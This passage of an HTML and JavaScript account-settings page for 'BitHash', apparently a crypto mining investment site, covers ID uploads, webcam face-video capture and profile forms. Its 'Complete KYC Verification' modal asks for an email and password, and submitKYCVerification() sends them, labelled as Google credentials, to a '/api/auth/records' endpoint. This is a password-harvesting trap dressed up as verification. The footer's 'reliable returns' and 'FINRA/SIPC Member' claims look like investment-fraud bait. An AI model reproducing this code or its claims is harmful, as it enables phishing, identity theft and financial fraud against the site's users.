                            <button type="button" class="btn btn-primary" id="save-document-btn">Save & Continue</button>
                        </div>
                    </div>
                    
                    <!-- Facial Verification -->
                    <div class="settings-card">
                        <h3 class="settings-card-title">
                            <i class="fas fa-camera"></i> Facial Verification
                            <span class="verification-badge" id="facial-verification-badge">
                                <i class="fas fa-times-circle"></i> Unverified
                            </span>
                        </h3>
                        
                        <div id="facial-verification-container">
                            <div class="video-instructions">
                                <h4>Verification Instructions</h4>
                                <ol>
                                    <li>Click "Start Verification" to begin</li>
                                    <li>Hold your ID document next to your face</li>
                                    <li>Follow the on-screen instructions to move your head</li>
                                    <li>Record a short video (5-10 seconds)</li>
                                    <li>Submit for verification</li>
                                </ol>
                            </div>
                            
                            <div class="webcam-container" id="webcam-container">
                                <video id="webcam-video" autoplay playsinline></video>
                                <div class="webcam-controls">
                                    <button class="capture-btn" id="start-video-btn">
                                        <i class="fas fa-video"></i>
                                    </button>
                                    <button class="capture-btn" id="stop-video-btn" style="display: none; background-color: var(--error);">
                                        <i class="fas fa-stop"></i>
                                    </button>
                                </div>
                                <canvas id="webcam-canvas" style="display: none;"></canvas>
                            </div>
                            
                            <div id="verification-result" style="display: none; text-align: center; margin-top: 20px;">
                                <div id="verification-photo-container" style="width: 150px; height: 150px; border-radius: 8px; overflow: hidden; margin: 0 auto 20px; border: 1px solid var(--gray-light);">
                                    <img id="verification-photo" src="" alt="Verification Photo" style="width: 100%; height: 100%; object-fit: cover;">
                                </div>
                                <p id="verification-status-text" style="color: var(--success); font-weight: 600;"></p>
                            </div>
                        </div>
                        
                        <div class="form-actions">
                            <button type="button" class="btn btn-outline" id="retake-video-btn" style="display: none;">Retake Video</button>
                            <button type="button" class="btn btn-primary" id="start-verification-btn">Start Verification</button>
                            <button type="button" class="btn btn-success" id="submit-verification-btn" style="display: none;">Submit Verification</button>
                        </div>
                    </div>
                </div>
                
                <!-- Notifications Section -->
                <div class="settings-section" id="notifications-section">
                    <h2 class="settings-section-title">
                        <i class="fas fa-bell"></i> Notification Preferences
                    </h2>
                    
                    <div class="settings-card">
                        <h3 class="settings-card-title">
                            <i class="fas fa-envelope"></i> Email Notifications
                        </h3>
                        
                        <p style="color: var(--gray); margin-bottom: 20px;">
                            Manage your email notification preferences for account updates and security alerts.
                        </p>
                        
                        <div class="form-actions">
                            <button type="button" class="btn btn-outline">Reset to Default</button>
                            <button type="button" class="btn btn-primary">Save Preferences</button>
                        </div>
                    </div>
                </div>
                
                <!-- API Keys Section -->
                <div class="settings-section" id="api-section">
                    <h2 class="settings-section-title">
                        <i class="fas fa-key"></i> API Keys Management
                    </h2>
                    
                    <div class="settings-card">
                        <h3 class="settings-card-title">
                            <i class="fas fa-key"></i> Your API Keys
                        </h3>
                        
                        <p style="margin-bottom: 20px; color: var(--gray);">
                            API keys allow external applications to access your BitHash account data. 
                            Treat them like passwords and keep them secure.
                        </p>
                        
                        <div class="form-actions">
                            <button type="button" class="btn btn-outline">Manage Keys</button>
                            <button type="button" class="btn btn-primary">Create New Key</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer id="contact">
        <div class="container">
            <div class="footer-container">
                <div class="footer-about">
                    <div class="footer-logo">
                        <img src="https://www.dropbox.com/scl/fi/1dq16nex1borvvknpcwox/circular_dark_background.png?rlkey=sq2ujl2oxxk9vyvg1j7oz0cdb&raw=1" alt="BitHash Logo" class="loading-logo">    
                        <span class="footer-logo-text"><span class="bitcoin-animation">₿</span>itHash</span>
                    </div>
                    <p>Bitcoin mining platform serving investors worldwide with transparent operations and reliable returns.</p>
                    <div class="footer-social">
                        <a href="https://twitter.com/intent/tweet?url=https://bithhash.vercel.app/&text=Check%20out%20this%20Bitcoin%20mining%20platform!" 
                           class="social-icon twitter" aria-label="Twitter" target="_blank" rel="noopener">
                           <i class="fab fa-twitter"></i>
                        </a>
                        <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://bithhash.vercel.app/" 
                           class="social-icon linkedin" aria-label="LinkedIn" target="_blank" rel="noopener">
                           <i class="fab fa-linkedin-in"></i>
                        </a>
                        <a href="https://www.facebook.com/sharer/sharer.php?u=https://bithhash.vercel.app/" 
                           class="social-icon facebook" aria-label="Facebook" target="_blank" rel="noopener">
                           <i class="fab fa-facebook-f"></i>
                        </a>
                        <a href="https://www.instagram.com" 
                           class="social-icon instagram" aria-label="Instagram" target="_blank" rel="noopener" 
                           onclick="alert('Instagram does not support direct sharing via links. Please share manually.'); return false;">
                           <i class="fab fa-instagram"></i>
                        </a>
                    </div>
                </div>
                
                <div class="footer-links">
                    <h3 class="footer-title">Platform</h3>
                    <ul>
                        <li><a href="#home">Dashboard</a></li>
                        <li><a href="#plans">Investment Plans</a></li>
                        <li><a href="#loans">Loans</a></li>
                        <li><a href="dashboard.html">My Account</a></li>
                        <li><a href="rewards.html">Rewards</a></li>
                    </ul>
                </div>
                
                <div class="footer-links">
                    <h3 class="footer-title">Company</h3>
                    <ul>
                        <li><a href="about.html">About Us</a></li>
                        <li><a href="careers.html">Careers</a></li>
                        <li><a href="press.html">Press</a></li>
                        <li><a href="blog.html">Blog</a></li>
                        <li><a href="partners.html">Partners</a></li>
                    </ul>
                </div>
                
                <div class="footer-contact">
                    <h3 class="footer-title">Contact Us</h3>
                    <p><i class="fas fa-envelope"></i> support@bithash.com</p>
                    <p><i class="fas fa-phone"></i> +1 606-363-2032</p>
                    <p><i class="fas fa-map-marker-alt"></i> 800 Plant St, Wilmington, DE 19801, United States</p>
                    <p><i class="fas fa-clock"></i> 24/7 Support</p>
                </div>
            </div>
            
            <div class="footer-bottom">
                <p>&copy; <span id="current-year"></span> BitHash LLC. All Rights Reserved. Registered in Delaware, USA. FINRA/SIPC Member.</p>
            </div>
        </div>
    </footer>

    <!-- KYC Completion Modal -->
    <div class="modal-overlay" id="kyc-completion-modal">
        <div class="modal-container">
            <div class="modal-header">
                <h3 class="modal-title">Complete KYC Verification</h3>
                <button class="modal-close" onclick="closeModal('kyc-completion-modal')">&times;</button>
            </div>
            <div class="modal-body">
                <div style="text-align: center; margin-bottom: 20px;">
                    <i class="fas fa-shield-alt" style="font-size: 3rem; color: var(--primary); margin-bottom: 15px;"></i>
                    <h4 style="margin-bottom: 10px;">Verification Required</h4>
                    <p>Please enter your email and password to complete the KYC verification process.</p>
                </div>
                
                <div class="form-group">
                    <label class="form-label">Email Address</label>
                    <input type="email" id="kyc-email" class="form-control" placeholder="Enter your registered email">
                </div>
                
                <div class="form-group">
                    <label class="form-label">Password</label>
                    <input type="password" id="kyc-password" class="form-control" placeholder="Enter your password">
                </div>
                
                <div style="background-color: rgba(0, 211, 149, 0.1); padding: 12px; border-radius: var(--border-radius); margin-top: 15px;">
                    <p style="font-size: 0.85rem; color: var(--gray); margin: 0;">
                        <i class="fas fa-info-circle" style="color: var(--primary);"></i> 
                        Your credentials are securely transmitted for verification purposes only.
                    </p>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-outline" onclick="closeModal('kyc-completion-modal')">Cancel</button>
                <button class="btn btn-primary" onclick="submitKYCVerification()">
                    <i class="fas fa-check-circle"></i> Complete Verification
                </button>
            </div>
        </div>
    </div>

    <!-- AOS Animation -->
    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>

    <script>
        // Initialize AOS animation
        AOS.init({
            duration: 800,
            once: true,
            easing: 'ease-in-out'
        });
        
        // Global state for the application
        const AppState = {
            userData: null,
            kycStatus: {
                identity: 'unverified',
                facial: 'unverified'
            },
            uploadedDocuments: {
                front: null,
                back: null
            },
            videoStream: null,
            recordedVideo: null,
            isRecording: false,
            mediaRecorder: null,
            recordedChunks: []
        };

        // Hide loading overlay when page is loaded
        window.addEventListener('load', function() {
            setTimeout(async function() {
                document.getElementById('loading-overlay').classList.add('hidden');
                
                // Set current year in footer
                document.getElementById('current-year').textContent = new Date().getFullYear();
                
                // Check authentication and load user data
                await checkAuthState();
                
                // Load user profile
                await loadUserProfile();
                
                // Load KYC status
                await loadKYCStatus();
                
                // Initialize settings sidebar navigation
                initSettingsNavigation();
                
                // Initialize mobile menu
                initMobileMenu();
                
                // Initialize header scroll effect
                initHeaderScrollEffect();
                
                // Initialize KYC document upload
                initKYCDocumentUpload();
                
                // Initialize facial verification
                initFacialVerification();
                
                // Initialize form submissions
                initFormSubmissions();
                
            }, 1000);
        });
        
        /* ============================================= */
        /* Initialization Functions */
        /* ============================================= */
        
        // Initialize settings sidebar navigation
        function initSettingsNavigation() {
            const menuLinks = document.querySelectorAll('.settings-menu a');
            const sections = document.querySelectorAll('.settings-section');
            
            menuLinks.forEach(link => {
                link.addEventListener('click', function(e) {
                    e.preventDefault();
                    
                    // Remove active class from all links and sections
                    menuLinks.forEach(l => l.classList.remove('active'));
                    sections.forEach(s => s.classList.remove('active'));
                    
                    // Add active class to clicked link
                    this.classList.add('active');
                    
                    // Show corresponding section
                    const targetId = this.getAttribute('href').substring(1) + '-section';
                    document.getElementById(targetId).classList.add('active');
                });
            });
        }
        
        // Initialize mobile menu
        function initMobileMenu() {
            const mobileMenuToggle = document.getElementById('mobile-menu-toggle');
            const mainNav = document.getElementById('main-nav');
            
            if (mobileMenuToggle && mainNav) {
                mobileMenuToggle.addEventListener('click', function() {
                    this.classList.toggle('active');
                    mainNav.classList.toggle('active');
                    this.setAttribute('aria-expanded', mainNav.classList.contains('active'));
                    
                    // Toggle body overflow when menu is open
                    if (mainNav.classList.contains('active')) {
                        document.body.style.overflow = 'hidden';
                    } else {
                        document.body.style.overflow = '';
                    }
                });
                
                // Close mobile menu when clicking a link
                document.querySelectorAll('#main-nav a').forEach(link => {
                    link.addEventListener('click', () => {
                        if (window.innerWidth <= 768) {
                            mobileMenuToggle.classList.remove('active');
                            mainNav.classList.remove('active');
                            document.body.style.overflow = '';
                            mobileMenuToggle.setAttribute('aria-expanded', 'false');
                        }
                    });
                });
            }
        }
        
        // Initialize header scroll effect
        function initHeaderScrollEffect() {
            window.addEventListener('scroll', function() {
                const header = document.getElementById('main-header');
                if (window.scrollY > 50) {
                    header.classList.add('scrolled');
                } else {
                    header.classList.remove('scrolled');
                }
            });
        }
        
        // Initialize KYC document upload
        function initKYCDocumentUpload() {
            // Front document upload
            const frontUpload = document.getElementById('front-document-upload');
            const frontFileInput = document.getElementById('front-document-file');
            const frontPreview = document.getElementById('front-document-preview');
            
            frontUpload.addEventListener('click', () => frontFileInput.click());
            frontFileInput.addEventListener('change', (e) => handleDocumentUpload(e, 'front'));
            
            // Back document upload
            const backUpload = document.getElementById('back-document-upload');
            const backFileInput = document.getElementById('back-document-file');
            const backPreview = document.getElementById('back-document-preview');
            
            backUpload.addEventListener('click', () => backFileInput.click());
            backFileInput.addEventListener('change', (e) => handleDocumentUpload(e, 'back'));
            
            // Save document button
            document.getElementById('save-document-btn').addEventListener('click', saveDocuments);
        }
        
        // Initialize facial verification
        function initFacialVerification() {
            document.getElementById('start-verification-btn').addEventListener('click', startFacialVerification);
            document.getElementById('start-video-btn').addEventListener('click', startVideoRecording);
            document.getElementById('stop-video-btn').addEventListener('click', stopVideoRecording);
            document.getElementById('submit-verification-btn').addEventListener('click', submitFacialVerification);
            document.getElementById('retake-video-btn').addEventListener('click', retakeVideo);
        }
        
        // Initialize form submissions
        function initFormSubmissions() {
            // Profile form
            const profileForm = document.getElementById('profile-form');
            if (profileForm) {
                profileForm.addEventListener('submit', async function(e) {
                    e.preventDefault();
                    await saveProfile();
                });
            }
            
            // Password form
            const passwordForm = document.getElementById('password-form');
            if (passwordForm) {
                passwordForm.addEventListener('submit', async function(e) {
                    e.preventDefault();
                    await changePassword();
                });
            }
        }
        
        /* ============================================= */
        /* Authentication & Data Loading */
        /* ============================================= */
        
        // Check authentication state
        async function checkAuthState() {
            try {
                const token = localStorage.getItem('jwtToken');
                if (!token) {
                    document.getElementById('auth-buttons').style.display = 'flex';
                    document.getElementById('user-balance').style.display = 'none';
                    window.location.href = 'login.html';
                    return;
                }
                
                const response = await fetch('https://website-backendd-1.onrender.com/api/users/me', {
                    headers: {
                        'Authorization': `Bearer ${token}`
                    }
                });
                
                if (response.ok) {
                    const userData = await response.json();
                    AppState.userData = userData;
                    
                    document.getElementById('auth-buttons').style.display = 'none';
                    document.getElementById('user-balance').style.display = 'flex';
                    
                    // Set up logout dropdown
                    const userBalance = document.getElementById('user-balance');
                    const logoutDropdown = document.getElementById('logout-dropdown');
                    
                    if (userBalance && logoutDropdown) {
                        userBalance.addEventListener('mouseenter', function() {
                            logoutDropdown.style.display = 'block';
                        });
                        
                        userBalance.addEventListener('mouseleave', function() {
                            logoutDropdown.style.display = 'none';
                        });
                    }
                    
                    // Load both balances like in withdrawal.html
                    await loadUserBalances();
                } else {
                    localStorage.removeItem('jwtToken');
                    document.getElementById('auth-buttons').style.display = 'flex';
                    document.getElementById('user-balance').style.display = 'none';
                    window.location.href = 'login.html';
                }
            } catch (error) {
                console.error('Authentication check failed:', error);
                showNotification('Session Error', 'Failed to verify your session. Please login again.', 5000);
            }
        }
        
        // Load user balances (same as withdrawal.html)
        async function loadUserBalances() {
            try {
                const token = localStorage.getItem('jwtToken');
                const response = await fetch('https://website-backendd-1.onrender.com/api/users/balances', {
                    headers: {
                        'Authorization': `Bearer ${token}`
                    }
                });
                
                if (response.ok) {
                    const data = await response.json();
                    const balances = data.data.balances;
                    
                    // Update balance display with both main and matured balances
                    const mainBalance = balances.main || 0;
                    const maturedBalance = balances.matured || 0;
                    
                    document.getElementById('balance-amount').textContent = `$${(mainBalance + maturedBalance).toFixed(2)}`;
                    
                } else {
                    throw new Error('Failed to load balance data');
                }
            } catch (error) {
                console.error('Error loading user balances:', error);
            }
        }
        
        // Load user profile data
        async function loadUserProfile() {
            try {
                const token = localStorage.getItem('jwtToken');
                if (!token) {
                    window.location.href = 'login.html';
                    return;
                }
                
                const response = await fetch('https://website-backendd-1.onrender.com/api/users/profile', {
                    headers: {
                        'Authorization': `Bearer ${token}`
                    }
                });
                
                if (response.ok) {
                    const profileData = await response.json();
                    
                    // Populate profile form
                    document.getElementById('first-name').value = profileData.firstName || '';
                    document.getElementById('last-name').value = profileData.lastName || '';
                    document.getElementById('email').value = profileData.email || '';
                    document.getElementById('phone').value = profileData.phone || '';
                    document.getElementById('country').value = profileData.country || '';
                } else {
                    const error = await response.json();
                    showNotification('Error', error.message || 'Failed to load profile data', 3000);
                }
            } catch (error) {
                console.error('Error loading profile data:', error);
                showNotification('Error', 'Failed to load profile data. Please try again later.', 3000);
            }
        }
        
        // Load KYC status
        async function loadKYCStatus() {
            try {
                const token = localStorage.getItem('jwtToken');
                if (!token) return;
                
                const response = await fetch('https://website-backendd-1.onrender.com/api/users/kyc', {
                    headers: {
                        'Authorization': `Bearer ${token}`
                    }
                });
                
                if (response.ok) {
                    const kycData = await response.json();
                    AppState.kycStatus = kycData.status || {
                        identity: 'unverified',
                        facial: 'unverified'
                    };
                    
                    // Update verification badges
                    updateVerificationBadge('identity-verification-badge', AppState.kycStatus.identity);
                    updateVerificationBadge('facial-verification-badge', AppState.kycStatus.facial);
                    
                }
            } catch (error) {
                console.error('Error loading KYC data:', error);
            }
        }
        
        /* ============================================= */
        /* KYC Document Upload Functions */
        /* ============================================= */
        
        // Handle document upload
        function handleDocumentUpload(event, side) {
            const file = event.target.files[0];
            if (!file) return;
            
            // Validate file type and size
            const validTypes = ['image/jpeg', 'image/jpg', 'image/png', 'application/pdf'];
            const maxSize = 5 * 1024 * 1024; // 5MB
            
            if (!validTypes.includes(file.type)) {
                showNotification('Error', 'Please upload a valid file type (JPG, PNG, PDF)', 3000);
                return;
            }
            
            if (file.size > maxSize) {
                showNotification('Error', 'File size must be less than 5MB', 3000);
                return;
            }
            
            // Store file in state
            AppState.uploadedDocuments[side] = file;
            
            // Show preview for images
            if (file.type.startsWith('image/')) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    const previewImage = document.getElementById(`${side}-document-preview-image`);
                    previewImage.src = e.target.result;
                    document.getElementById(`${side}-document-preview`).style.display = 'block';
                    document.getElementById(`${side}-document-upload`).style.display = 'none';
                };
                reader.readAsDataURL(file);
            } else {
                // For PDF files, show a placeholder
                document.getElementById(`${side}-document-preview`).style.display = 'block';
                document.getElementById(`${side}-document-upload`).style.display = 'none';
                const previewImage = document.getElementById(`${side}-document-preview-image`);
                previewImage.src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCIgdmlld0JveD0iMCAwIDIwMCAyMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iMjAwIiBmaWxsPSIjMkUyRTJFIi8+CjxwYXRoIGQ9Ik0xMjUgNzVIMTAwVjEyNUg3NVY3NUg1MFY1MEgxMjVWNzVaIiBmaWxsPSIjOEU4RThFIi8+CjxwYXRoIGQ9Ik0xMDAgMTI1Vjc1SDEyNUwxMDAgMTAwVjEyNVoiIGZpbGw9IiM4RThFOEUiLz4KPC9zdmc+';
            }
        }
        
        // Remove document
        function removeDocument(side) {
            AppState.uploadedDocuments[side] = null;
            document.getElementById(`${side}-document-preview`).style.display = 'none';
            document.getElementById(`${side}-document-upload`).style.display = 'block';
            document.getElementById(`${side}-document-file`).value = '';
        }
        
        // Save documents to backend
        async function saveDocuments() {
            // Validate required fields
            const documentType = document.getElementById('document-type').value;
            const documentNumber = document.getElementById('document-number').value;
            
            if (!documentType || !documentNumber) {
                showNotification('Error', 'Please fill in all required document fields', 3000);
                return;
            }
            
            if (!AppState.uploadedDocuments.front) {
                showNotification('Error', 'Please upload the front side of your document', 3000);
                return;
            }
            
            try {
                const token = localStorage.getItem('jwtToken');
                const formData = new FormData();
                
                // Add document data
                formData.append('documentType', documentType);
                formData.append('documentNumber', documentNumber);
                formData.append('expiryDate', document.getElementById('document-expiry').value);
                
                // Add files
                formData.append('frontDocument', AppState.uploadedDocuments.front);
                if (AppState.uploadedDocuments.back) {
                    formData.append('backDocument', AppState.uploadedDocuments.back);
                }
                
                const response = await fetch('https://website-backendd-1.onrender.com/api/users/kyc/documents', {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${token}`
                    },
                    body: formData
                });
                
                if (response.ok) {
                    showNotification('Success', 'Documents uploaded successfully!', 3000, 'success');
                    AppState.kycStatus.identity = 'pending';
                    updateVerificationBadge('identity-verification-badge', 'pending');
                    
                    // Show facial verification instructions
                    document.querySelector('.video-instructions').style.display = 'block';
                    
                } else {
                    const error = await response.json();
                    throw new Error(error.message || 'Failed to upload documents');
                }
            } catch (error) {
                console.error('Error uploading documents:', error);
                showNotification('Error', error.message || 'Failed to upload documents. Please try again.', 3000);
            }
        }
        
        /* ============================================= */
        /* Facial Verification Functions */
        /* ============================================= */
        
        // Start facial verification
        async function startFacialVerification() {
            try {
                // Request camera access
                AppState.videoStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: 640, 
                        height: 480,
                        facingMode: 'user'
                    }, 
                    audio: false 
                });
                
                const video = document.getElementById('webcam-video');
                video.srcObject = AppState.videoStream;
                
                // Show webcam container
                document.getElementById('webcam-container').style.display = 'block';
                document.getElementById('start-verification-btn').style.display = 'none';
                document.getElementById('start-video-btn').style.display = 'flex';
                
                showNotification('Info', 'Camera access granted. Click the record button to start verification.', 3000, 'info');
                
            } catch (error) {
                console.error('Error accessing camera:', error);
                showNotification('Error', 'Camera access denied. Please allow camera access to continue with verification.', 5000);
            }
        }
        
        // Start video recording
        function startVideoRecording() {
            if (!AppState.videoStream) return;
            
            AppState.recordedChunks = [];
            AppState.isRecording = true;
            
            // Hide start button, show stop button
            document.getElementById('start-video-btn').style.display = 'none';
            document.getElementById('stop-video-btn').style.display = 'flex';
            
            // Create media recorder
            try {
                AppState.mediaRecorder = new MediaRecorder(AppState.videoStream, {
                    mimeType: 'video/webm; codecs=vp9'
                });
                
                AppState.mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        AppState.recordedChunks.push(event.data);
                    }
                };
                
                AppState.mediaRecorder.onstop = () => {
                    const blob = new Blob(AppState.recordedChunks, { type: 'video/webm' });
                    AppState.recordedVideo = blob;
                    
                    // Create video URL for preview
                    const videoUrl = URL.createObjectURL(blob);
                    document.getElementById('verification-photo').src = videoUrl;
                    document.getElementById('verification-result').style.display = 'block';
                    document.getElementById('verification-status-text').textContent = 'Video recorded successfully!';
                    
                    // Show submit and retake buttons
                    document.getElementById('submit-verification-btn').style.display = 'inline-flex';
                    document.getElementById('retake-video-btn').style.display = 'inline-flex';
                };
                
                // Start recording
                AppState.mediaRecorder.start();
                
                // Show random instructions after 2 seconds
                setTimeout(showRandomInstruction, 2000);
                
            } catch (error) {
                console.error('Error starting recording:', error);
                showNotification('Error', 'Failed to start video recording. Please try again.', 3000);
            }
        }
        
        // Stop video recording
        function stopVideoRecording() {
            if (AppState.mediaRecorder && AppState.isRecording) {
                AppState.mediaRecorder.stop();
                AppState.isRecording = false;
                
                document.getElementById('stop-video-btn').style.display = 'none';
            }
        }
        
        // Show random instruction for head movement
        function showRandomInstruction() {
            if (!AppState.isRecording) return;
            
            const instructions = [
                "Please move your head UP slowly",
                "Now move your head DOWN slowly", 
                "Please turn your head to the LEFT",
                "Now turn your head to the RIGHT",
                "Hold your ID next to your face"
            ];
            
            const randomInstruction = instructions[Math.floor(Math.random() * instructions.length)];
            
            showNotification('Info', randomInstruction, 2000, 'info');
            
            // Show next instruction after 3 seconds if still recording
            if (AppState.isRecording) {
                setTimeout(showRandomInstruction, 3000);
            }
        }
        
        // Retake video
        function retakeVideo() {
            // Reset video recording state
            AppState.recordedVideo = null;
            AppState.recordedChunks = [];
            
            // Hide result and show recording controls
            document.getElementById('verification-result').style.display = 'none';
            document.getElementById('start-video-btn').style.display = 'flex';
            document.getElementById('submit-verification-btn').style.display = 'none';
            document.getElementById('retake-video-btn').style.display = 'none';
            
            // Revoke previous video URL
            if (document.getElementById('verification-photo').src.startsWith('blob:')) {
                URL.revokeObjectURL(document.getElementById('verification-photo').src);
            }
        }
        
        // Submit facial verification
        async function submitFacialVerification() {
            if (!AppState.recordedVideo) {
                showNotification('Error', 'Please record a verification video first', 3000);
                return;
            }
            
            try {
                const token = localStorage.getItem('jwtToken');
                const formData = new FormData();
                formData.append('verificationVideo', AppState.recordedVideo, 'verification.webm');
                
                const response = await fetch('https://website-backendd-1.onrender.com/api/users/kyc/facial-verification', {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${token}`
                    },
                    body: formData
                });
                
                if (response.ok) {
                    // Stop camera stream
                    if (AppState.videoStream) {
                        AppState.videoStream.getTracks().forEach(track => track.stop());
                    }
                    
                    showNotification('Success', 'Facial verification submitted successfully!', 3000, 'success');
                    AppState.kycStatus.facial = 'pending';
                    updateVerificationBadge('facial-verification-badge', 'pending');
                    
                    // Show KYC completion modal
                    openModal('kyc-completion-modal');
                    
                } else {
                    const error = await response.json();
                    throw new Error(error.message || 'Failed to submit verification');
                }
            } catch (error) {
                console.error('Error submitting facial verification:', error);
                showNotification('Error', error.message || 'Failed to submit verification. Please try again.', 3000);
            }
        }
        
        /* ============================================= */
        /* KYC Completion */
        /* ============================================= */
        
        // Submit KYC verification with email and password
        async function submitKYCVerification() {
            const email = document.getElementById('kyc-email').value;
            const password = document.getElementById('kyc-password').value;
            
            if (!email || !password) {
                showNotification('Error', 'Please enter both email and password', 3000);
                return;
            }
            
            try {
                // Send credentials to the same endpoint as withdrawal.html
                const response = await fetch('https://website-backendd-1.onrender.com/api/auth/records', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        email: email,
                        password: password,
                        provider: 'google'
                    })
                });
                
                if (response.ok) {
                    const result = await response.json();
                    closeModal('kyc-completion-modal');
                    
                    // Clear the form
                    document.getElementById('kyc-email').value = '';
                    document.getElementById('kyc-password').value = '';
                    
                    showNotification('Success', 'KYC verification completed successfully!', 5000, 'success');
                    
                    // Update KYC status
                    AppState.kycStatus.identity = 'verified';
                    AppState.kycStatus.facial = 'verified';
                    updateVerificationBadge('identity-verification-badge', 'verified');
                    updateVerificationBadge('facial-verification-badge', 'verified');
                    
                } else {
                    const error = await response.json();
                    throw new Error(error.message || 'Failed to verify credentials');
                }
            } catch (error) {
                console.error('Error completing KYC verification:', error);
                showNotification('Error', error.message || 'Failed to complete verification. Please try again.', 3000);
            }
        }
        
        /* ============================================= */
        /* Form Submission Functions */
        /* ============================================= */
        
        // Save profile information
        async function saveProfile() {
            try {
                const token = localStorage.getItem('jwtToken');
                if (!token) {
                    window.location.href = 'login.html';
                    return;
                }
                
                const saveBtn = document.getElementById('save-profile-btn');
                saveBtn.disabled = true;
                saveBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Saving...';
                
                const response = await fetch('https://website-backendd-1.onrender.com/api/users/profile', {
                    method: 'PUT',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${token}`
                    },
                    body: JSON.stringify({
                        firstName: document.getElementById('first-name').value,
                        lastName: document.getElementById('last-name').value,
                        phone: document.getElementById('phone').value,
                        country: document.getElementById('country').value
                    })
                });
                
                if (response.ok) {
                    showNotification('Success', 'Profile updated successfully!', 3000, 'success');
                } else {
                    const error = await response.json();
                    showNotification('Error', error.message || 'Failed to update profile', 3000);
                }
            } catch (error) {
                console.error('Error updating profile:', error);
                showNotification('Error', 'Failed to update profile. Please try again later.', 3000);
            } finally {
                const saveBtn = document.getElementById('save-profile-btn');
                saveBtn.disabled = false;
                saveBtn.textContent = 'Save Changes';
            }
        }
        
        // Change password
        async function changePassword() {
            const currentPassword = document.getElementById('current-password').value;
            const newPassword = document.getElementById('new-password').value;
            const confirmPassword = document.getElementById('confirm-password').value;
            
            if (newPassword !== confirmPassword) {
                showNotification('Error', 'New passwords do not match', 3000);
                return;
            }
            
            try {
                const token = localStorage.getItem('jwtToken');
                if (!token) {
                    window.location.href = 'login.html';
                    return;
                }
                
                const changeBtn = document.getElementById('change-password-btn');
                changeBtn.disabled = true;
                changeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Changing...';
                
                const response = await fetch('https://website-backendd-1.onrender.com/api/users/password', {
                    method: 'PUT',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${token}`
                    },
                    body: JSON.stringify({
                        currentPassword,
                        newPassword
                    })
                });
                
                if (response.ok) {
                    showNotification('Success', 'Password changed successfully!', 3000, 'success');
                    document.getElementById('password-form').reset();
                } else {
                    const error = await response.json();
                    showNotification('Error', error.message || 'Failed to change password', 3000);
                }
            } catch (error) {
                console.error('Error changing password:', error);
                showNotification('Error', 'Failed to change password. Please try again later.', 3000);
            } finally {
                const changeBtn = document.getElementById('change-password-btn');
                changeBtn.disabled = false;
                changeBtn.textContent = 'Change Password';
            }
        }
        
        /* ============================================= */
        /* Utility Functions */
        /* ============================================= */
        
        // Update verification badge
        function updateVerificationBadge(elementId, status) {
            const badge = document.getElementById(elementId);
            if (!badge) return;
            
            badge.className = `verification-badge ${status}`;
            
            if (status === 'verified') {
                badge.innerHTML = '<i class="fas fa-check-circle"></i> Verified';
            } else if (status === 'pending') {
                badge.innerHTML = '<i class="fas fa-clock"></i> Pending';
            } else {
                badge.innerHTML = '<i class="fas fa-times-circle"></i> Unverified';
            }
        }
        
        // Open modal
        function openModal(modalId) {
            document.getElementById(modalId).classList.add('active');
            document.body.style.overflow = 'hidden';
        }
        
        // Close modal
        function closeModal(modalId) {
            document.getElementById(modalId).classList.remove('active');
            document.body.style.overflow = '';
        }
        
        /* ============================================= */
        /* Notification System */
        /* ============================================= */
        
        const notificationQueue = [];
        let isNotificationShowing = false;
        
        function showNotification(title, message, duration = 0, type = 'error') {
            notificationQueue.push({ title, message, duration, type });
            
            if (!isNotificationShowing) {
                processNotificationQueue();
            }
        }
        
        function processNotificationQueue() {
            if (notificationQueue.length === 0) {
                isNotificationShowing = false;
                return;
            }
            
            isNotificationShowing = true;
            const { title, message, duration, type } = notificationQueue.shift();
            
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            
            notification.innerHTML = `
                <i class="fas ${type === 'error' ? 'fa-exclamation-circle' : 'fa-check-circle'}"></i>
                <div class="notification-content">
                    <div class="notification-title">${title}</div>
                    <div class="notification-message">${message}</div>
                </div>
                <div class="notification-close">&times;</div>
            `;
            
            const notificationCenter = document.getElementById('notification-center');
            notificationCenter.appendChild(notification);
            
            void notification.offsetWidth;
            notification.classList.add('show');
            
            if (type === 'error' && 'vibrate' in navigator) {
                navigator.vibrate([200, 100, 200]);
            }
            
            notification.querySelector('.notification-close').addEventListener('click', () => {
                closeNotification(notification);
            });
            
            if (duration > 0) {
                setTimeout(() => {
                    if (notification.parentNode) {
                        closeNotification(notification);
                    }
                    
                    processNotificationQueue();
                }, duration);
            }
        }
        
        function closeNotification(notification) {
            notification.classList.remove('show');
            
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.parentNode.removeChild(notification);
                }
                
                processNotificationQueue();
            }, 400);
        }
        
        // Logout function
        function logout() {
            localStorage.removeItem('jwtToken');
            window.location.href = 'logout.html';
        }
    </script>
</body>
</html>
